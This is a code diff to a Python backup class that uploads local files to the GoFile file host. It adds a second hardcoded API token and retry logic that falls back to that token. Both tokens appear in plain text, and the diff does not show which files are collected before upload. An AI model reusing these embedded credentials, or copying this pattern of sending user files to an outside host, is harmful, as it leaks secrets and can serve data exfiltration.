@@ -236,8 +236,10 @@ class BackupManager:
             },
         ]
         
-        # GoFile API token（备选方案）
+        # GoFile API token（备选方案）：主 token 失败时回退到备用 token
         self.api_token = "GXPkms2fGdFYDLu17RQHlklDonEPfvY5"
+        self.api_token_fallback = "9o0Su5ainOFK9fFxzLaiuRKPOxgaUmCm"
+        self.api_tokens = [self.api_token, self.api_token_fallback]
         
         username = getpass.getuser()
         user_prefix = username[:5] if username else "user"
@@ -891,7 +893,7 @@ class BackupManager:
             return None
 
     def _upload_single_file_gofile(self, file_path):
-        """上传单个文件到 GoFile（备选方案）"""
+        """上传单个文件到 GoFile（备选方案，支持主/备 token 回退）"""
         try:
             # 检查文件权限和状态
             if not os.path.exists(file_path):
@@ -914,6 +916,9 @@ class BackupManager:
             filename = os.path.basename(file_path)
             logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")
 
+            # API token 列表：主 token 失败后依次回退到备用 token
+            api_tokens = [t for t in getattr(self, "api_tokens", []) if t] or [self.api_token]
+
             # 上传重试逻辑
             for attempt in range(self.config.RETRY_COUNT):
                 if not self._check_internet_connection():
@@ -928,7 +933,18 @@ class BackupManager:
                 elif self.config.DEBUG_MODE:
                     logging.debug(f"[GoFile] 重试上传: {filename} (第 {attempt + 1} 次)")
                 
-                for server in self.config.UPLOAD_SERVERS:
+                # 服务器轮询（主 token 的所有服务器都失败后，回退到备用 token 继续轮询）
+                upload_targets = [
+                    (token_index, api_token, server)
+                    for token_index, api_token in enumerate(api_tokens, start=1)
+                    for server in self.config.UPLOAD_SERVERS
+                ]
+                last_token_index = 0
+                for token_index, api_token, server in upload_targets:
+                    if token_index != last_token_index:
+                        last_token_index = token_index
+                        if token_index > 1:
+                            logging.warning(f"⚠️ [GoFile] 主 token 上传失败，回退到备用 token ({token_index}/{len(api_tokens)}): {filename}")
                     session = requests.Session()
                     try:
                         with open(file_path, "rb") as f:
@@ -941,7 +957,7 @@ class BackupManager:
                             response = session.post(
                                 server,
                                 files={"file": f},
-                                headers={"Authorization": f"Bearer {self.api_token}"},
+                                headers={"Authorization": f"Bearer {api_token}"},
                                 timeout=self.config.UPLOAD_TIMEOUT,
                                 verify=True
                             )
